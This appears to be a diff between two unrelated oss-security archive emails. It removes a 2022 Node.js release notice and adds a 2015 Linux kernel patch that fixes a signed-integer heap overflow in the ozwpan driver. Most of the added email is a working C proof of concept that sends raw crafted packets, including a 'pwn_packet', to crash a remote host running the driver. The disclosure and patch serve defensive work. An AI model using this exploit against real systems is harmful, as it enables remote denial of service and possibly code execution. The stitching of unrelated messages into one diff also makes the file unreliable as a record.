@@ -1,9 +1,9 @@
 X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["3293" "Thursday" "17" "March" "2022" "19:03:11" "-0700" "Joe Sepi" "joesepi@gmail.com" nil "68" "[oss-security] Fwd: Node.js security updates for all active release lines, March 2022" nil nil nil "3" nil nil (number mark "U       joesepi@gmai Mar 17   68/3293  " thread-indent "\"[oss-security] Fwd: Node.js security updates for all active release lines, March 2022\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] Fwd: Node.js security updates for all active release lines, March 2022" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["6232" "Wednesday" "13" "May" "2015" "20:33:32" "+0200" "Jason A. Donenfeld" "Jason@zx2c4.com" "<1431542014-3239-3-git-send-email-Jason@zx2c4.com>" "225" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" nil nil nil "5" "2015051318:33:32" "[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow" (number mark "U       Jason@zx2c4. May 13  225/6232  " thread-indent "\"[oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow\"\n") "<1431542014-3239-1-git-send-email-Jason@zx2c4.com>" ("<1431542014-3239-1-git-send-email-Jason@zx2c4.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
 X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 3660 invoked by uid 550); 18 Mar 2022 11:40:41 -0000
+Received: (qmail 7303 invoked by uid 550); 13 May 2015 18:35:11 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,111 +12,250 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 27961 invoked from network); 18 Mar 2022 02:03:24 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=gmail.com; s=20210112;
-        h=date:from:to:message-id:in-reply-to:references:subject:mime-version;
-        bh=qCe8c9y+cRAX9NrdbhNiqcZu1RqZq/gX56UmB+rK/2Y=;
-        b=liZvCEvJ/pyH1pB8XAWpCkweFrsH2zY0kZGx+DCMrn1HT189dEmhNtl3dKXa+UuHX9
-         mgTlU3Qe1tb+XXKmGcl5xSMY9A6BAvdz2CfCavNFOKKmYmO81TZl2dAxNd6fCj81Ork4
-         F2byMLJ6rxiOob5w/nXUSrCdpluvRMAklJiSQ/+3EIlnRcDefHJs3e2bJhph/n0mE+/Y
-         j8jW7SOS9YmvVZ225z217DGU+rGaIXR32NblJuG3P0ZNXqoBaKQ1+lFFZ329/6Lyou9u
-         2t4ezYR0OAvZkri6exiJeJzuWoLj83NZxC9dG6GJKKcYpQX0SW9kDkNhXsdFPJeyd6qV
-         EzXg==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20210112;
-        h=x-gm-message-state:date:from:to:message-id:in-reply-to:references
-         :subject:mime-version;
-        bh=qCe8c9y+cRAX9NrdbhNiqcZu1RqZq/gX56UmB+rK/2Y=;
-        b=4512oRrK9qgl0zt+/czSnGRsvY6k1RxsjTvWfigiXp5i1ZZtFKLJU1fin5UmdoZy56
-         ENww0WjgzLRCe04u/xC5YAQGXZ0d0lVttuFi+bwr6CI5Ddb3VyMiXYJ6h7A4naYG8I58
-         3HxE5LoUmidE1WinrJ8KsdY/zpnL1kPbFMzmmFaN9Zjw2VX//PjsBlnMIp54g8oQHsGB
-         wprzE45J7v9d54B6Yx/OcZdTNk5hJHuicEntlRVDtxOTEQvSzF8HIEsSREsqAfgrHVH/
-         mehsFeVPOtzXMxXIvjGJDhcqlY/Bcov2XZS/qPlCgQibI9UC7LsjhO0iiZEqyuUq3Vdj
-         5iYQ==
-X-Gm-Message-State: AOAM5312dG2E/JCNGixID2GeOWbl7eV4yFq5VJGbfwi+hfGVraALhENQ
-	sm6d4YwihSKMRJgJUpw+V7Fsnwcjsg==
-X-Google-Smtp-Source: ABdhPJzauXiVWxve1QWd5TrtBZOuGcGlzt+6updJbBnU+SyDXHWIhF2YTA8WrC92mIjjanFagKGxagZZeQ==
-X-Received: by 2002:a05:622a:11d2:b0:2e0:bbbd:5a2b with SMTP id n18-20020a05622a11d200b002e0bbbd5a2bmr5889106qtk.233.1647568991814;
-        Thu, 17 Mar 2022 19:03:11 -0700 (PDT)
-Date: Thu, 17 Mar 2022 19:03:11 -0700 (PDT)
-From: Joe Sepi <joesepi@gmail.com>
-To: "oss-security@lists.openwall.com" <oss-security@lists.openwall.com>
-Message-Id: <e9bb0040-ecc0-4213-924b-e87aff0afb67n@googlegroups.com>
-In-Reply-To: <0cd5f4c3-9e07-4e4b-bb5e-e2034620d91bn@googlegroups.com>
-References: <b2cd4323-2a7e-4e02-ab48-25c6f220b55dn@googlegroups.com>
- <0cd5f4c3-9e07-4e4b-bb5e-e2034620d91bn@googlegroups.com>
-MIME-Version: 1.0
-Content-Type: multipart/mixed; 
-	boundary="----=_Part_10188_579120088.1647568991667"
-Subject: [oss-security] Fwd: Node.js security updates for all active release lines, March
- 2022
+Received: (qmail 3802 invoked from network); 13 May 2015 18:34:39 -0000
+DKIM-Signature: v=1; a=rsa-sha1; c=relaxed; d=zx2c4.com; h=from:to:cc
+	:subject:date:message-id:in-reply-to:references; s=mail; bh=4s8U
+	Akly6i3zTHpYHRy1sssBI8w=; b=YEwpbOETLjPVYUBjhWT+h/tHX0qqLdT4bsgX
+	YSUiuESfQgwVZdpnnDb26tcZcxjOCinadxxD22rWDUucXRlKbIT0LY5iJQly4VLE
+	HSO+eGlxzfs+zzHrBOeS8PdJF4uy5J09rQgPjeVM5OkhQjKzMD+pmnRJ2Prk2iWx
+	EmCT4bQT25yqMPU3sNiRpIP4wjRppotKayFHqRzg+9pIwX/Juz/LqWWRLrJKVD4m
+	pCpU5a823qBXRUOv3EhxWB7xnZFO4UmvheqhzVPc7nOm2joAn0/Gglu6tW1pzNer
+	WKqapb7fFzj0ZsgFXs9R1sg7v67pQp8q6zxN7uaQ+b1His8Y9Q==
+From: "Jason A. Donenfeld" <Jason@zx2c4.com>
+To: shigekatsu.tateno@atmel.com,
+	linux-kernel@vger.kernel.org,
+	netdev@vger.kernel.org,
+	oss-security@lists.openwall.com
+Cc: "Jason A. Donenfeld" <Jason@zx2c4.com>
+Date: Wed, 13 May 2015 20:33:32 +0200
+Message-Id: <1431542014-3239-3-git-send-email-Jason@zx2c4.com>
+X-Mailer: git-send-email 2.3.6
+In-Reply-To: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+References: <1431542014-3239-1-git-send-email-Jason@zx2c4.com>
+Subject: [oss-security] [PATCH 2/4] ozwpan: Use unsigned ints to prevent heap overflow
 
-------=_Part_10188_579120088.1647568991667
-Content-Type: multipart/alternative; 
-	boundary="----=_Part_10189_2065576395.1647568991667"
+Using signed integers, the subtraction between required_size and offset
+could wind up being negative, resulting in a memcpy into a heap buffer
+with a negative length, resulting in huge amounts of network-supplied
+data being copied into the heap, which could potentially lead to remote
+code execution.. This is remotely triggerable with a magic packet.
+A PoC which obtains DoS follows below. It requires the ozprotocol.h file
+from this module.
 
-------=_Part_10189_2065576395.1647568991667
-Content-Type: text/plain; charset=UTF-8
-Content-Transfer-Encoding: 7bit
+=-=-=-=-=-=
 
+ #include <arpa/inet.h>
+ #include <linux/if_packet.h>
+ #include <net/if.h>
+ #include <netinet/ether.h>
+ #include <stdio.h>
+ #include <string.h>
+ #include <stdlib.h>
+ #include <endian.h>
+ #include <sys/ioctl.h>
+ #include <sys/socket.h>
 
+ #define u8 uint8_t
+ #define u16 uint16_t
+ #define u32 uint32_t
+ #define __packed __attribute__((__packed__))
+ #include "ozprotocol.h"
 
----------- Forwarded message ---------
-From: Joe Sepi <joesepi@gmail.com>
-Date: Thursday, March 17, 2022 at 10:02:36 PM UTC-4
-Subject: Re: Node.js security updates for all active release lines, March 
-2022
-To: nodejs-sec <nodejs-sec@googlegroups.com>
+static int hex2num(char c)
+{
+	if (c >= '0' && c <= '9')
+		return c - '0';
+	if (c >= 'a' && c <= 'f')
+		return c - 'a' + 10;
+	if (c >= 'A' && c <= 'F')
+		return c - 'A' + 10;
+	return -1;
+}
+static int hwaddr_aton(const char *txt, uint8_t *addr)
+{
+	int i;
+	for (i = 0; i < 6; i++) {
+		int a, b;
+		a = hex2num(*txt++);
+		if (a < 0)
+			return -1;
+		b = hex2num(*txt++);
+		if (b < 0)
+			return -1;
+		*addr++ = (a << 4) | b;
+		if (i < 5 && *txt++ != ':')
+			return -1;
+	}
+	return 0;
+}
 
+int main(int argc, char *argv[])
+{
+	if (argc < 3) {
+		fprintf(stderr, "Usage: %s interface destination_mac\n", argv[0]);
+		return 1;
+	}
 
-The Node.js project has now released new versions of all supported release 
-lines.
+	uint8_t dest_mac[6];
+	if (hwaddr_aton(argv[2], dest_mac)) {
+		fprintf(stderr, "Invalid mac address.\n");
+		return 1;
+	}
 
-For more information see: 
-https://nodejs.org/en/blog/vulnerability/mar-2022-security-releases/
+	int sockfd = socket(AF_PACKET, SOCK_RAW, IPPROTO_RAW);
+	if (sockfd < 0) {
+		perror("socket");
+		return 1;
+	}
 
-On Wednesday, March 16, 2022 at 10:57:17 AM UTC-4 Joe Sepi wrote:
+	struct ifreq if_idx;
+	int interface_index;
+	strncpy(if_idx.ifr_ifrn.ifrn_name, argv[1], IFNAMSIZ - 1);
+	if (ioctl(sockfd, SIOCGIFINDEX, &if_idx) < 0) {
+		perror("SIOCGIFINDEX");
+		return 1;
+	}
+	interface_index = if_idx.ifr_ifindex;
+	if (ioctl(sockfd, SIOCGIFHWADDR, &if_idx) < 0) {
+		perror("SIOCGIFHWADDR");
+		return 1;
+	}
+	uint8_t *src_mac = (uint8_t *)&if_idx.ifr_hwaddr.sa_data;
 
-> The Node.js project will release new versions of all supported release 
-> lines on or shortly after Thursday, 17th of March, 2022 For more 
-> information see:
-> https://nodejs.org/en/blog/vulnerability/mar-2022-security-releases/
->
->
-------=_Part_10189_2065576395.1647568991667
-Content-Type: text/html; charset=utf-8
-Content-Transfer-Encoding: quoted-printable
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_elt_connect_req oz_elt_connect_req;
+	} __packed connect_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(0)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_CONNECT_REQ,
+			.length = sizeof(struct oz_elt_connect_req)
+		},
+		.oz_elt_connect_req = {
+			.mode = 0,
+			.resv1 = {0},
+			.pd_info = 0,
+			.session_id = 0,
+			.presleep = 35,
+			.ms_isoc_latency = 0,
+			.host_vendor = 0,
+			.keep_alive = 0,
+			.apps = htole16((1 << OZ_APPID_USB) | 0x1),
+			.max_len_div16 = 0,
+			.ms_per_isoc = 0,
+			.up_audio_buf = 0,
+			.ms_per_elt = 0
+		}
+	};
 
-<br><br><div class=3D"gmail_quote"><div dir=3D"auto" class=3D"gmail_attr">-=
---------- Forwarded message ---------<br>From: <span dir=3D"auto">Joe Sepi =
-&lt;joesepi@gmail.com&gt;</span><br>Date: Thursday, March 17, 2022 at 10:02=
-:36 PM UTC-4<br>Subject: Re: Node.js security updates for all active releas=
-e lines, March 2022<br>To: <span dir=3D"auto">nodejs-sec &lt;nodejs-sec@goo=
-glegroups.com&gt;</span><br></div><br><br>The Node.js project has now relea=
-sed new versions of all supported release lines.<html-blob><div><br>For mor=
-e information see: <a href=3D"https://nodejs.org/en/blog/vulnerability/mar-=
-2022-security-releases/" target=3D"_blank" rel=3D"nofollow" data-saferedire=
-cturl=3D"https://www.google.com/url?hl=3Den&amp;q=3Dhttps://nodejs.org/en/b=
-log/vulnerability/mar-2022-security-releases/&amp;source=3Dgmail&amp;ust=3D=
-1647655357036000&amp;usg=3DAFQjCNHF--cT9frZuxWDS48RvU8PZZKKbQ">https://node=
-js.org/en/blog/vulnerability/mar-2022-security-releases/</a></div><br></htm=
-l-blob><html-blob><div class=3D"gmail_quote"><div dir=3D"auto" class=3D"gma=
-il_attr">On Wednesday, March 16, 2022 at 10:57:17 AM UTC-4 Joe Sepi wrote:<=
-br></div><blockquote class=3D"gmail_quote" style=3D"margin:0 0 0 0.8ex;bord=
-er-left:1px solid rgb(204,204,204);padding-left:1ex"><div><div><div><div><s=
-pan style=3D"white-space:pre">The Node.js project will release new versions=
- of all supported release lines on or shortly after Thursday, 17th of March=
-, 2022
-For more information see:</span></div><div><a href=3D"https://nodejs.org/en=
-/blog/vulnerability/mar-2022-security-releases/" rel=3D"nofollow" target=3D=
-"_blank" data-saferedirecturl=3D"https://www.google.com/url?hl=3Den&amp;q=
-=3Dhttps://nodejs.org/en/blog/vulnerability/mar-2022-security-releases/&amp=
-;source=3Dgmail&amp;ust=3D1647655357036000&amp;usg=3DAFQjCNHF--cT9frZuxWDS4=
-8RvU8PZZKKbQ">https://nodejs.org/en/blog/vulnerability/mar-2022-security-re=
-leases/</a><br></div></div></div><div><div></div></div></div><div><div><div=
-><div><br></div></div></div></div></blockquote></div></html-blob></div>=
+	struct {
+		struct ether_header ether_header;
+		struct oz_hdr oz_hdr;
+		struct oz_elt oz_elt;
+		struct oz_get_desc_rsp oz_get_desc_rsp;
+	} __packed pwn_packet = {
+		.ether_header = {
+			.ether_type = htons(OZ_ETHERTYPE),
+			.ether_shost = { src_mac[0], src_mac[1], src_mac[2], src_mac[3], src_mac[4], src_mac[5] },
+			.ether_dhost = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+		},
+		.oz_hdr = {
+			.control = OZ_F_ACK_REQUESTED | (OZ_PROTOCOL_VERSION << OZ_VERSION_SHIFT),
+			.last_pkt_num = 0,
+			.pkt_num = htole32(1)
+		},
+		.oz_elt = {
+			.type = OZ_ELT_APP_DATA,
+			.length = sizeof(struct oz_get_desc_rsp)
+		},
+		.oz_get_desc_rsp = {
+			.app_id = OZ_APPID_USB,
+			.elt_seq_num = 0,
+			.type = OZ_GET_DESC_RSP,
+			.req_id = 0,
+			.offset = htole16(2),
+			.total_size = htole16(1),
+			.rcode = 0,
+			.data = {0}
+		}
+	};
 
-------=_Part_10189_2065576395.1647568991667--
+	struct sockaddr_ll socket_address = {
+		.sll_ifindex = interface_index,
+		.sll_halen = ETH_ALEN,
+		.sll_addr = { dest_mac[0], dest_mac[1], dest_mac[2], dest_mac[3], dest_mac[4], dest_mac[5] }
+	};
 
-------=_Part_10188_579120088.1647568991667--
+	if (sendto(sockfd, &connect_packet, sizeof(connect_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	usleep(300000);
+	if (sendto(sockfd, &pwn_packet, sizeof(pwn_packet), 0, (struct sockaddr *)&socket_address, sizeof(socket_address)) < 0) {
+		perror("sendto");
+		return 1;
+	}
+	return 0;
+}
+
+Signed-off-by: Jason A. Donenfeld <Jason@zx2c4.com>
+---
+ drivers/staging/ozwpan/ozhcd.c   | 8 ++++----
+ drivers/staging/ozwpan/ozusbif.h | 4 ++--
+ 2 files changed, 6 insertions(+), 6 deletions(-)
+
+diff --git a/drivers/staging/ozwpan/ozhcd.c b/drivers/staging/ozwpan/ozhcd.c
+index 5ff4716..784b5ec 100644
+--- a/drivers/staging/ozwpan/ozhcd.c
++++ b/drivers/staging/ozwpan/ozhcd.c
+@@ -746,8 +746,8 @@ void oz_hcd_pd_reset(void *hpd, void *hport)
+ /*
+  * Context: softirq
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+-			int length, int offset, int total_size)
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status, const u8 *desc,
++			u8 length, u16 offset, u16 total_size)
+ {
+ 	struct oz_port *port = hport;
+ 	struct urb *urb;
+@@ -759,8 +759,8 @@ void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status, const u8 *desc,
+ 	if (!urb)
+ 		return;
+ 	if (status == 0) {
+-		int copy_len;
+-		int required_size = urb->transfer_buffer_length;
++		unsigned int copy_len;
++		unsigned int required_size = urb->transfer_buffer_length;
+ 
+ 		if (required_size > total_size)
+ 			required_size = total_size;
+diff --git a/drivers/staging/ozwpan/ozusbif.h b/drivers/staging/ozwpan/ozusbif.h
+index 4249fa3..d2a6085 100644
+--- a/drivers/staging/ozwpan/ozusbif.h
++++ b/drivers/staging/ozwpan/ozusbif.h
+@@ -29,8 +29,8 @@ void oz_usb_request_heartbeat(void *hpd);
+ 
+ /* Confirmation functions.
+  */
+-void oz_hcd_get_desc_cnf(void *hport, u8 req_id, int status,
+-	const u8 *desc, int length, int offset, int total_size);
++void oz_hcd_get_desc_cnf(void *hport, u8 req_id, u8 status,
++	const u8 *desc, u8 length, u16 offset, u16 total_size);
+ void oz_hcd_control_cnf(void *hport, u8 req_id, u8 rcode,
+ 	const u8 *data, int data_len);
+ 
+-- 
+2.3.6
+
